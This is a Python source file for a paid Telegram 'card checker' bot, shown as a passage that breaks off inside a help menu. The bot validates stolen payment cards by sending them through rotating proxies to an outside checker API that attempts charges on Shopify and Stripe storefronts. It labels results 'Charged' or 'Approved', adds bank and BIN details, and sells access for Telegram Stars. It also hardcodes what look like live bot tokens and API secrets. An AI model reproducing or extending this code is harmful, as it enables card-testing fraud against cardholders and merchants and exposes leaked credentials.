import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import secrets
import urllib.parse
from datetime import datetime, timedelta
from telethon import TelegramClient, events, Button

# ==================== إعدادات البوت ====================
CHECKER_API_URL = 'https://apiehopf-production.up.railway.app'

API_ID = 38208016
API_HASH = '0d52125034b6a0d0dac3e71b40cea032'
BOT_TOKEN = '8985561921:AAH26NPSH3Iin7RCpKfi1Q057X1umDjfgds'
ADMIN_IDS = [1093032296,7077116674]

# ==================== أسعار الاشتراك بالنجوم ====================
SUBSCRIPTION_PLANS = {
    "1h": {"name": "1 Hour", "stars": 30, "seconds": 3600, "product_id": "1h"},
    "12h": {"name": "12 Hours", "stars": 50, "seconds": 43200, "product_id": "12h"},
    "1d": {"name": "1 Day", "stars": 100, "seconds": 86400, "product_id": "1d"},
    "3d": {"name": "3 Days", "stars": 250, "seconds": 259200, "product_id": "3d"},
    "week": {"name": "1 Week", "stars": 500, "seconds": 604800, "product_id": "week"}
}

DEFAULT_CHECK_LIMIT = 5000
ADMIN_MAX_CHECKS = 999999
PENDING_TIMEOUT = 300
MAX_USER_PROXIES = 30

bot = TelegramClient('sonic_bot', API_ID, API_HASH)

# ==================== دوال مساعدة ====================
def is_admin(user_id):
    return user_id in ADMIN_IDS

USERS_FILE = 'users.json'
CODES_FILE = 'codes.json'
SITES_FILE = 'sites.txt'

def load_admin_sites():
    if not os.path.exists(SITES_FILE):
        return []
    try:
        with open(SITES_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def save_admin_sites(sites):
    with open(SITES_FILE, 'w', encoding='utf-8') as f:
        for site in sites:
            f.write(f"{site}\n")

def get_user_proxy_file(user_id):
    return f"user_{user_id}_proxy.txt"

def load_user_proxies(user_id):
    file_path = get_user_proxy_file(user_id)
    if not os.path.exists(file_path):
        return []
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def save_user_proxies(user_id, proxies):
    file_path = get_user_proxy_file(user_id)
    with open(file_path, 'w', encoding='utf-8') as f:
        for proxy in proxies:
            f.write(f"{proxy}\n")

def load_users():
    if not os.path.exists(USERS_FILE):
        return {}
    try:
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_users(users):
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

def load_codes():
    if not os.path.exists(CODES_FILE):
        return {}
    try:
        with open(CODES_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_codes(codes):
    with open(CODES_FILE, 'w', encoding='utf-8') as f:
        json.dump(codes, f, indent=2, ensure_ascii=False)

def get_user_subscription(user_id):
    users = load_users()
    user_data = users.get(str(user_id), {})
    expiry = user_data.get('subscription_expiry', 0)
    if expiry > time.time():
        return True, expiry
    return False, 0

def activate_subscription(user_id, plan_key):
    """تفعيل اشتراك للمستخدم"""
    plan = SUBSCRIPTION_PLANS.get(plan_key)
    if not plan:
        return False, "Invalid plan"
    
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {}
    
    now = time.time()
    current_expiry = users[user_id_str].get('subscription_expiry', 0)
    
    if current_expiry > now:
        new_expiry = current_expiry + plan['seconds']
    else:
        new_expiry = now + plan['seconds']
    
    users[user_id_str]['subscription_expiry'] = new_expiry
    users[user_id_str]['premium'] = True
    users[user_id_str]['check_limit'] = DEFAULT_CHECK_LIMIT
    
    save_users(users)
    return True, new_expiry

def get_user_checks_left(user_id):
    if is_admin(user_id):
        return ADMIN_MAX_CHECKS
    users = load_users()
    user_data = users.get(str(user_id), {})
    total_checks = user_data.get('total_checks', 0)
    limit = user_data.get('check_limit', DEFAULT_CHECK_LIMIT)
    return max(0, limit - total_checks)

def increment_user_checks(user_id, count=1):
    if is_admin(user_id):
        return
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {}
    users[user_id_str]['total_checks'] = users[user_id_str].get('total_checks', 0) + count
    save_users(users)

def generate_activation_code():
    return secrets.token_hex(8).upper()

def create_activation_code(checks_limit=DEFAULT_CHECK_LIMIT):
    codes = load_codes()
    code = generate_activation_code()
    codes[code] = {
        'checks_limit': checks_limit,
        'used': False,
        'used_by': None,
        'created_at': datetime.now().isoformat()
    }
    save_codes(codes)
    return code

def activate_code(user_id, code):
    if is_admin(user_id):
        return True, "أنت أدمن، لا تحتاج تفعيل!"
    codes = load_codes()
    if code not in codes:
        return False, "الكود غير صالح!"
    code_data = codes[code]
    if code_data.get('used', False):
        return False, "الكود مستخدم من قبل!"
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {}
    users[user_id_str]['premium'] = True
    users[user_id_str]['check_limit'] = code_data['checks_limit']
    users[user_id_str]['total_checks'] = users[user_id_str].get('total_checks', 0)
    users[user_id_str]['activated_at'] = datetime.now().isoformat()
    code_data['used'] = True
    code_data['used_by'] = user_id_str
    code_data['used_at'] = datetime.now().isoformat()
    save_users(users)
    save_codes(codes)
    return True, f"تم التفعيل بنجاح! لديك {code_data['checks_limit']} عملية فحص متاحة."

def is_user_blocked(user_id):
    if is_admin(user_id):
        return False
    users = load_users()
    user_data = users.get(str(user_id), {})
    return user_data.get('blocked', False)

def block_user(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {}
    users[user_id_str]['blocked'] = True
    save_users(users)

def unblock_user(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str in users:
        users[user_id_str]['blocked'] = False
        save_users(users)

def get_all_users():
    users = load_users()
    return users

def is_premium_user(user_id):
    if is_admin(user_id):
        return True
    users = load_users()
    user_data = users.get(str(user_id), {})
    return user_data.get('premium', False)

def is_user_subscribed(user_id):
    if is_admin(user_id):
        return True
    is_active, _ = get_user_subscription(user_id)
    if is_active:
        return True
    return is_premium_user(user_id) and get_user_checks_left(user_id) > 0

async def create_user_if_not_exists(user_id, username):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {
            'user_id': user_id,
            'username': username,
            'registered_at': datetime.now().isoformat(),
            'total_checks': 0,
            'successful_checks': 0,
            'premium': False,
            'check_limit': 0,
            'blocked': False,
            'subscription_expiry': 0
        }
        save_users(users)
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_message(admin_id, premium_emoji(f"🆕 <b>New user joined!</b>\n\n🆔 ID: <code>{user_id}</code>\n👤 Username: @{username}\n📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"), parse_mode='html')
            except:
                pass

# ==================== إدارة الملفات المنتظرة ====================
user_pending_mass = {}
user_pending_sites = {}

async def cleanup_expired_pending():
    now = time.time()
    for user_id in list(user_pending_mass.keys()):
        if user_pending_mass[user_id]['expires'] < now:
            try:
                os.remove(user_pending_mass[user_id]['file_path'])
            except:
                pass
            del user_pending_mass[user_id]
    for user_id in list(user_pending_sites.keys()):
        if user_pending_sites[user_id]['expires'] < now:
            del user_pending_sites[user_id]

# ==================== دوال API ====================

PREMIUM_EMOJI_IDS = {
    "✅": "5123163417326126159",
    "❌": "5121063440311386962",
    "🔥": "5116414868357907335",
    "⚡": "5219943216781995020",
    "💳": "5447453226498552490",
    "💠": "5870498447068502918",
    "📝": "5444860552310457690",
    "🌐": "5447602197439218445",
    "📊": "4911241630633165627",
    "📦": "5303102515301083665",
    "📋": "5305618829265628111",
    "⏳": "5303382628773161521",
    "🚀": "5303534082204920602",
    "⚠️": "5305473345838410805",
    "💎": "5305726937887433606",
    "👋": "5134653266591744867",
    "💡": "5231264265242954153",
    "📈": "5134457377428341766",
    "🔢": "5305652587708572354",
    "🔌": "5305622454218024328",
    "⭐": "5801104080646444587",
    "🆓": "5116382939571028928",
    "👑": "5303547611351902889",
    "🔍": "5305346287820895195",
    "⏱️": "5303243514782443814",
    "💥": "5122933683820430249",
    "🆔": "5447311106030726740",
    "👤": "5445174334031166029",
    "📅": "5082628525303792441",
    "🔄": "5454245266305604993",
    "🏦": "5303159080020372094",
    "🥰": "5881784744949062058",
    "😱": "5868517294618975202",
    "💰": "5303159080020372094",
}

def premium_emoji(text: str) -> str:
    if not text:
        return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(
            emoji, 
            f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>'
        )
    return result

active_sessions = {}
user_current_check = {}
user_chk_mode = {}

_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:','handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'proxy dead', 'invalid proxy format', 'no proxy',
)

def get_main_menu_keyboard():
    return [
        [Button.inline("𝗖𝗺𝗱", b"show_commands")],
        [Button.url("𝗖𝗵𝗮𝗻𝗻𝗲𝗹", "https://t.me/ISoonik")]
    ]

def get_commands_keyboard():
    return [
        [Button.inline("𝗕𝗮𝗰𝗸", b"main_menu")]
    ]

def get_admin_menu_keyboard():
    return [
        [Button.inline("📊 Stats", b"admin_stats")],
        [Button.inline("📢 Broadcast", b"admin_broadcast")],
        [Button.inline("🔨 Block", b"admin_block")],
        [Button.inline("🔓 Unblock", b"admin_unblock")],
        [Button.inline("📈 Set Limit", b"admin_set_limit")],
        [Button.inline("🌐 Site Management", b"admin_sites")],
        [Button.inline("🔙 Back", b"main_menu")]
    ]

def get_admin_sites_menu():
    return [
        [Button.inline("📋 View Sites", b"admin_view_sites")],
        [Button.inline("➕ Add Site", b"admin_add_site")],
        [Button.inline("🗑️ Remove Site", b"admin_remove_site")],
        [Button.inline("🔄 Check Sites", b"admin_check_sites")],
        [Button.inline("📁 Upload Sites File", b"admin_upload_sites")],
        [Button.inline("💣 Clear All Sites", b"admin_clear_sites")],
        [Button.inline("🔙 Back", b"admin_panel")]
    ]

def get_subscription_keyboard():
    return [
        [Button.inline("⭐ 1 Hour - 30⭐", b"sub_1h")],
        [Button.inline("⭐ 12 Hours - 50⭐", b"sub_12h")],
        [Button.inline("⭐ 1 Day - 100⭐", b"sub_1d")],
        [Button.inline("⭐ 3 Days - 250⭐", b"sub_3d")],
        [Button.inline("⭐ 1 Week - 500⭐", b"sub_week")],
        [Button.inline("🔙 Back", b"main_menu")]
    ]

def get_price_filter_keyboard():
    return [
        [Button.inline(PRICE_RANGES["1"]["name"], b"price_1")],
        [Button.inline(PRICE_RANGES["2"]["name"], b"price_2")],
        [Button.inline(PRICE_RANGES["3"]["name"], b"price_3")],
        [Button.inline(PRICE_RANGES["4"]["name"], b"price_4")]
    ]

async def get_user_stats_text(user_id, username):
    users = load_users()
    user_data = users.get(str(user_id), {})
    total_checks = user_data.get('total_checks', 0)
    checks_left = get_user_checks_left(user_id)
    is_premium_user = user_data.get('premium', False) or is_admin(user_id)
    is_blocked = user_data.get('blocked', False)
    proxies_count = len(load_user_proxies(user_id))
    is_active, expiry = get_user_subscription(user_id)
    
    if is_blocked:
        status = "🚫 Blocked"
    elif is_admin(user_id):
        status = "👑 ADMIN | Unlimited"
    elif is_active:
        remaining = int(expiry - time.time())
        hours = remaining // 3600
        minutes = (remaining % 3600) // 60
        status = f"⭐ PREMIUM | {hours}h {minutes}m left"
    elif is_premium_user:
        status = f"⭐ PREMIUM | {checks_left} checks left"
    else:
        status = "🆓 FREE | Subscribe /subscribe"
    
    text = f"👋 Welcome , @{username}!\n\n"
    text += f" Account 🚀 \n\n"
    text += f"    ┣ 📝 Plan: {status}\n"
    text += f"    ┣ 🔌 Proxies: {proxies_count}\n"  
    text += f"    ┣ 💥 Hits: {user_data.get('successful_checks', 0)}\n"
    text += f"    ┗ 📈 Total: {total_checks}\n\n"
    
    # المواقع تظهر للأدمن فقط
    if is_admin(user_id):
        sites = load_admin_sites()
        sites_count = len(sites)
        sites_preview = "\n".join([f"    ┣ 🌐 {site}" for site in sites[:5]])
        if sites_count > 5:
            sites_preview += f"\n    ┗ ... and {sites_count - 5} more"
        elif sites_count == 0:
            sites_preview = "    ┣ 🌐 No sites available"
        text += f" 🌐 Available Sites ({sites_count}):\n"
        text += f"{sites_preview}\n\n"
    
    text += f"💡 Made by: @ISoonik"
    return text

# ==================== دوال فحص البروكسيات ====================

def parse_proxy_url(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if '@' in proxy_str and ':' in proxy_str.split('@')[0]:
        return f"http://{proxy_str}"
    parts = proxy_str.split(':')
    if len(parts) == 4:
        host, port, user, password = parts
        return f"http://{user}:{password}@{host}:{port}"
    if len(parts) == 2:
        host, port = parts
        return f"http://{host}:{port}"
    if proxy_str.startswith('http://') or proxy_str.startswith('https://'):
        return proxy_str
    return None

async def test_proxy_direct(proxy_str):
    proxy_url = parse_proxy_url(proxy_str)
    if not proxy_url:
        return {'proxy': proxy_str, 'status': 'dead', 'reason': 'Invalid proxy format'}
    
    test_url = "https://musicstore.myshopify.com"
    
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get(test_url, proxy=proxy_url, ssl=False) as resp:
                if resp.status == 200:
                    return {'proxy': proxy_str, 'status': 'alive', 'reason': f'HTTP {resp.status}'}
                else:
                    return {'proxy': proxy_str, 'status': 'dead', 'reason': f'HTTP {resp.status}'}
    except asyncio.TimeoutError:
        return {'proxy': proxy_str, 'status': 'dead', 'reason': 'Timeout (15s)'}
    except aiohttp.ClientConnectorError:
        return {'proxy': proxy_str, 'status': 'dead', 'reason': 'Connection refused'}
    except aiohttp.ClientProxyConnectionError:
        return {'proxy': proxy_str, 'status': 'dead', 'reason': 'Proxy connection failed'}
    except Exception as e:
        return {'proxy': proxy_str, 'status': 'dead', 'reason': f'Error: {str(e)[:40]}'}

async def test_proxy_with_retry(proxy_str, max_retries=2):
    for attempt in range(max_retries):
        result = await test_proxy_direct(proxy_str)
        if result['status'] == 'alive':
            return result
        if attempt < max_retries - 1:
            await asyncio.sleep(1)
    return result

async def test_proxy_batch(proxies, batch_size=20):
    results = []
    for i in range(0, len(proxies), batch_size):
        batch = proxies[i:i+batch_size]
        tasks = [test_proxy_with_retry(proxy) for proxy in batch]
        batch_results = await asyncio.gather(*tasks)
        results.extend(batch_results)
    return results

# ==================== دوال فحص المواقع ====================

ALLOWED_GATEWAYS = ['shopify payments', 'shopify', 'shopify_payments', 'stripe']

PRICE_RANGES = {
    "1": {"name": "🔰 1$ - 10$", "min": 1, "max": 10},
    "2": {"name": "💰 5$ - 20$", "min": 5, "max": 20},
    "3": {"name": "💎 10$ - 30$", "min": 10, "max": 30},
    "4": {"name": "⭐ No filter", "min": 0, "max": 999999}
}

async def get_site_gateway(site, proxy):
    test_card = "4031630422575208|01|2030|280"
    try:
        if site.startswith('https://') or site.startswith('http://'):
            site = site.replace('https://', '').replace('http://', '').rstrip('/')
        url = f'{CHECKER_API_URL}/shopify?site={site}&cc={test_card}'
        if proxy:
            url += f'&proxy={proxy}'
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return None
                raw = await resp.json()
                gateway = raw.get('Gateway', '').lower()
                return gateway
    except Exception:
        return None

async def get_site_min_price(site):
    try:
        if site.startswith('https://') or site.startswith('http://'):
            site = site.replace('https://', '').replace('http://', '').rstrip('/')
        url = f'https://{site}/products.json?limit=50'
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return None
                data = await resp.json()
                products = data.get('products', [])
                min_price = None
                for product in products:
                    variants = product.get('variants', [])
                    for variant in variants:
                        if variant.get('available', True):
                            try:
                                price = float(variant.get('price', 0))
                                if min_price is None or price < min_price:
                                    min_price = price
                            except:
                                pass
                return min_price
    except Exception:
        return None

async def test_site(site, proxy):
    test_card = "4031630422575208|01|2030|280"
    try:
        if site.startswith('https://') or site.startswith('http://'):
            site = site.replace('https://', '').replace('http://', '').rstrip('/')
        url = f'{CHECKER_API_URL}/shopify?site={site}&cc={test_card}'
        if proxy:
            url += f'&proxy={proxy}'
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'site': site, 'status': 'dead'}
                try:
                    raw = await resp.json()
                    if raw.get('Status', False):
                        return {'site': site, 'status': 'alive'}
                    else:
                        return {'site': site, 'status': 'dead'}
                except:
                    return {'site': site, 'status': 'dead'}
    except Exception:
        return {'site': site, 'status': 'dead'}

# ==================== دوال فحص الكروت ====================

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card, 'site': site}

        if site.startswith('https://') or site.startswith('http://'):
            site = site.replace('https://', '').replace('http://', '').rstrip('/')

        url = f'{CHECKER_API_URL}/shopify?site={site}&cc={card}'
        if proxy:
            url += f'&proxy={proxy}'
        
        timeout = aiohttp.ClientTimeout(total=120)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'status': 'Dead', 'message': f'HTTP Error: {resp.status}', 'card': card, 'site': site}
                try:
                    raw = await resp.json()
                except Exception as e:
                    return {'status': 'Dead', 'message': f'Invalid JSON: {str(e)}', 'card': card, 'site': site}

        response_msg = raw.get('Response', '')
        price = raw.get('Price', 0.0)
        gateway = raw.get('Gateway', 'Shopify')

        try:
            price_val = float(price)
            price = f"${price_val:.2f}"
        except:
            price = "-"

        charged_keywords = ['ORDER_PLACED', 'PROCESSEDRECEIPT', 'ORDER_CONFIRMED', 'SUCCESS', 'CHARGED']
        approved_keywords = ['INSUFFICIENT_FUNDS', 'INSUFFICIENT FUNDS', 'OTP_REQUIRED', '3D_SECURE', 'ACTION_REQUIRED', '3D']
        
        response_upper = response_msg.upper()
        
        if any(kw in response_upper for kw in charged_keywords):
            print(f"[✓] CHARGED: {card} | {response_msg}")
            return {
                'status': 'Charged', 
                'message': response_msg, 
                'card': card, 
                'site': site, 
                'gateway': gateway, 
                'price': price
            }
        elif any(kw in response_upper for kw in approved_keywords):
            print(f"[!] APPROVED: {card} | {response_msg}")
            return {
                'status': 'Approved', 
                'message': response_msg, 
                'card': card, 
                'site': site, 
                'gateway': gateway, 
                'price': price
            }
        else:
            print(f"[✗] DEAD: {card} | {response_msg}")
            return {
                'status': 'Dead', 
                'message': response_msg if response_msg else 'Card Declined', 
                'card': card, 
                'site': site, 
                'gateway': gateway, 
                'price': price
            }

    except asyncio.TimeoutError:
        print(f"[!] TIMEOUT: {card}")
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'site': site, 'retry': True}
    except Exception as e:
        error_msg = str(e)
        print(f"[!] ERROR: {card} | {error_msg}")
        if is_dead_site_error(error_msg):
            return {'status': 'Site Error', 'message': error_msg, 'card': card, 'site': site, 'retry': True}
        return {'status': 'Dead', 'message': error_msg, 'card': card, 'site': site, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    last_result = None
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'site': 'None'}
    if not proxies:
         return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'site': 'None'}

    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)
        if not result.get('retry'):
            return result
        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.5)

    if last_result:
        return {'status': 'Dead', 'message': f'Site errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-', 'site': 'None'}

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '')
                    return brand, bin_type, level, bank, country, flag
                except:
                    return '-', '-', '-', '-', '-', ''
    except:
        return '-', '-', '-', '-', '-', ''

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(error_msg):
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

async def send_hit_message(user_id, result, hit_type):
    if hit_type == 'Charged':
        emoji = "💎"
        status_text = "𝐂𝐇𝐀𝐑𝐆𝐄𝐃"
    else:
        emoji = "✅"
        status_text = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃"

    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])

    message = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡ 𝐇𝐢𝐭</b>
<blockquote>{emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
"""

    try:
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    except:
        pass

# ==================== أوامر البوت الأساسية ====================

ALLOWED_COMMANDS = ['/start', '/help', '/subscribe', '/redeem']

def is_command_allowed_before_subscribe(command):
    for allowed in ALLOWED_COMMANDS:
        if command.startswith(allowed):
            return True
    return False

@bot.on(events.NewMessage)
async def check_subscription(event):
    user_id = event.sender_id
    message_text = event.raw_text
    
    if is_admin(user_id):
        return
    
    if is_command_allowed_before_subscribe(message_text):
        return
    
    if not is_user_subscribed(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this bot.\n\nSubscribe: /subscribe\nRedeem code: /redeem CODE"), parse_mode='html')
        raise events.StopPropagation

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>You have been banned from this bot.</b>"), parse_mode='html')
        return
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    await create_user_if_not_exists(user_id, username)
    stats_text = await get_user_stats_text(user_id, username)
    await event.reply(
        premium_emoji(stats_text),
        buttons=get_main_menu_keyboard(),
        parse_mode='html'
    )

# ==================== نظام الدفع بالنجوم ====================

async def create_star_invoice(user_id, plan_key):
    """إنشاء رابط دفع بالنجوم"""
    plan = SUBSCRIPTION_PLANS.get(plan_key)
    if not plan:
        return None
    
    # إنشاء payload فريد للمعاملة
    payload = f"sub_{plan_key}_{user_id}_{int(time.time())}"
    
    # رابط الدفع المباشر
    # الصيغة: https://t.me/بوتك?start=payload
    invoice_link = f"https://t.me/{(await bot.get_me()).username}?start=pay_{payload}"
    
    return invoice_link

@bot.on(events.NewMessage(pattern='/subscribe'))
async def subscribe_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>You have been banned from this bot.</b>"), parse_mode='html')
        return
    
    text = """⭐ <b>SONIC SUBSCRIPTION</b>

Choose your plan:

├ 1 Hour - 30⭐
├ 12 Hours - 50⭐
├ 1 Day - 100⭐
├ 3 Days - 250⭐
└ 1 Week - 500⭐

Click on a plan below to pay with Telegram Stars.

After payment, your subscription will be activated automatically."""
    
    await event.reply(premium_emoji(text), buttons=get_subscription_keyboard(), parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"sub_1h|sub_12h|sub_1d|sub_3d|sub_week"))
async def handle_subscription_payment(event):
    user_id = event.sender_id
    data = event.data.decode('utf-8')
    plan_key = data.split("_")[1]
    plan = SUBSCRIPTION_PLANS.get(plan_key)
    
    if not plan:
        await event.answer("Invalid plan", alert=True)
        return
    
    # إنشاء رابط دفع
    payload = f"pay_{plan_key}_{user_id}_{int(time.time())}"
    bot_username = (await bot.get_me()).username
    
    # رابط الدفع (سيتم إرساله كزر)
    pay_url = f"https://t.me/{bot_username}?start={payload}"
    
    # رسالة تأكيد الدفع
    await event.edit(
        premium_emoji(f"⭐ <b>Payment for {plan['name']}</b>\n\n"
                      f"Amount: {plan['stars']} stars\n"
                      f"Duration: {plan['name']}\n\n"
                      f"Click the button below to pay with Telegram Stars.\n\n"
                      f"After payment, your subscription will be activated automatically."),
        buttons=[[Button.url(f"Pay {plan['stars']}⭐", pay_url)], [Button.inline("🔙 Back", b"subscribe_back")]],
        parse_mode='html'
    )
    await event.answer()

@bot.on(events.CallbackQuery(pattern=b"subscribe_back"))
async def subscribe_back(event):
    user_id = event.sender_id
    text = """⭐ <b>SONIC SUBSCRIPTION</b>

Choose your plan:

├ 1 Hour - 30⭐
├ 12 Hours - 50⭐
├ 1 Day - 100⭐
├ 3 Days - 250⭐
└ 1 Week - 500⭐

Click on a plan below to pay with Telegram Stars.

After payment, your subscription will be activated automatically."""
    
    await event.edit(premium_emoji(text), buttons=get_subscription_keyboard(), parse_mode='html')
    await event.answer()

# معالجة دفع النجوم (عندما يضغط المستخدم على /start مع payload)
@bot.on(events.NewMessage(pattern='/start pay_'))
async def handle_star_payment_start(event):
    user_id = event.sender_id
    payload = event.message.text.replace('/start ', '').replace('pay_', '')
    
    parts = payload.split('_')
    if len(parts) >= 2:
        plan_key = parts[0]
        plan = SUBSCRIPTION_PLANS.get(plan_key)
        
        if plan:
            # هنا هنحتاج نتحقق من الدفع
            # للأسف Telethon لا يدعم التحقق من دفع النجوم مباشرة
            # بديل: نطلب من المستخدم إرسال إثبات الدفع
            await event.reply(
                premium_emoji(f"⭐ <b>Payment Initiated</b>\n\n"
                              f"Please send {plan['stars']} stars to this bot.\n\n"
                              f"After sending, your subscription will be activated within a few minutes.\n\n"
                              f"Plan: {plan['name']}\n"
                              f"Price: {plan['stars']} stars\n\n"
                              f"If you don't receive activation, contact @ISoonik with payment proof."),
                parse_mode='html'
            )

@bot.on(events.NewMessage(pattern='/start'))
async def start_without_payload(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>You have been banned from this bot.</b>"), parse_mode='html')
        return
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    await create_user_if_not_exists(user_id, username)
    stats_text = await get_user_stats_text(user_id, username)
    await event.reply(
        premium_emoji(stats_text),
        buttons=get_main_menu_keyboard(),
        parse_mode='html'
    )

# ==================== باقي أوامر البوت ====================

@bot.on(events.CallbackQuery)
async def handle_menu_callback(event):
    user_id = event.sender_id
    data = event.data.decode('utf-8')
    
    if is_user_blocked(user_id) and not is_admin(user_id) and data not in ["admin_stats", "admin_broadcast", "admin_block", "admin_unblock", "admin_set_limit", "admin_sites", "admin_view_sites", "admin_add_site", "admin_remove_site", "admin_check_sites", "admin_upload_sites", "admin_clear_sites", "admin_panel", "subscribe_back"]:
        await event.answer("🚫 You are banned", alert=True)
        return
    
    if not is_admin(user_id) and not is_user_subscribed(user_id) and data not in ["show_commands", "main_menu", "sub_1h", "sub_12h", "sub_1d", "sub_3d", "sub_week", "subscribe_back"]:
        await event.answer("❌ Not subscribed! Use /subscribe", alert=True)
        return
    
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    
    if data == "show_commands":
        commands_text = """<b>📋 BASIC COMMANDS</b>
├ <code>/start</code> - Show main menu
├ <code>/help</code> - Show help
├ <code>/profile</code> - View your profile
├ <code>/myproxy</code> - View your proxies

<b>🔌 PROXY MANAGEMENT</b>
├ <code>/proxy</code> - Check all proxies & remove dead
├ <code>/addproxy</code> - Add proxies (one per line)
